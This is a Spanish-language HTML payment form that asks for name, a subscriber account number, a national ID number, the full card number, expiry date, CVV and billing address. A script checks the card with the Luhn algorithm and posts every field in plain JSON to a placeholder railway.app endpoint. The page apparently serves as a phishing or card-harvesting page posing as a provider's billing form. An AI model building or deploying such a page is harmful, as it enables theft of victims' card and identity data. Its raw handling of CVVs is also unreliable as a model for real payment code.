<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Pago</title>
</head>
<body>
    <h1>Formulario de Pago</h1>
    <form id="payment-form">
        <!-- Información del cliente -->
        <label for="firstName">Nombre:</label>
        <input type="text" id="firstName" name="firstName" required><br><br>

        <label for="lastName">Apellido:</label>
        <input type="text" id="lastName" name="lastName" required><br><br>

        <label for="accountNumber">Número de Cuenta (Suscriptor):</label>
        <input type="text" id="accountNumber" name="accountNumber" required><br><br>

        <label for="idNumber">Número de Identificación:</label>
        <input type="text" id="idNumber" name="idNumber" required><br><br>

        <!-- Información de pago -->
        <h2>Afilia su Pago</h2>

        <label for="cardNumber">Número de Tarjeta:</label>
        <input type="text" id="cardNumber" name="cardNumber" required><br><br>

        <label for="expiryDate">Fecha de Vencimiento (MM/AA):</label>
        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" required><br><br>

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" required><br><br>

        <label for="billingAddress">Dirección de Facturación:</label>
        <input type="text" id="billingAddress" name="billingAddress" required><br><br>

        <button type="submit">Enviar</button>
    </form>

    <script>
        // Validación avanzada del formulario
        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const accountNumber = document.getElementById('accountNumber').value;
            const idNumber = document.getElementById('idNumber').value;
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');  // Remueve espacios
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;
            const billingAddress = document.getElementById('billingAddress').value;

            // Validar número de tarjeta de crédito usando el algoritmo de Luhn
            function validCardNumber(number) {
                let nCheck = 0, nDigit = 0, bEven = false;
                for (let n = number.length - 1; n >= 0; n--) {
                    let cDigit = number.charAt(n),
                        nDigit = parseInt(cDigit, 10);
                    if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
                    nCheck += nDigit;
                    bEven = !bEven;
                }
                return (nCheck % 10) === 0;
            }

            // Validar fecha de vencimiento
            function validExpiryDate(date) {
                const [month, year] = date.split('/');
                const currentYear = new Date().getFullYear() % 100; // Los dos últimos dígitos del año
                const currentMonth = new Date().getMonth() + 1;

                if (month < 1 || month > 12 || year < currentYear || (year == currentYear && month < currentMonth)) {
                    return false;
                }
                return true;
            }

            // Validar CVV (debe ser de 3 o 4 dígitos)
            function validCVV(cvv) {
                return /^[0-9]{3,4}$/.test(cvv);
            }

            // Verificación de los datos
            if (!validCardNumber(cardNumber)) {
                alert('Número de tarjeta inválido');
                return;
            }

            if (!validExpiryDate(expiryDate)) {
                alert('Fecha de vencimiento inválida');
                return;
            }

            if (!validCVV(cvv)) {
                alert('CVV inválido');
                return;
            }

            // Si todo es válido, enviamos los datos al servidor
            fetch('https://tu-servidor.railway.app/enviar', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    firstName: firstName,
                    lastName: lastName,
                    accountNumber: accountNumber,
                    idNumber: idNumber,
                    cardNumber: cardNumber,
                    expiryDate: expiryDate,
                    cvv: cvv,
                    billingAddress: billingAddress,
                }),
            }).then(response => {
                if (response.ok) {
                    alert('Datos enviados correctamente');
                } else {
                    alert('Hubo un problema al enviar los datos');
                }
            });
        });
    </script>
</body>
</html>
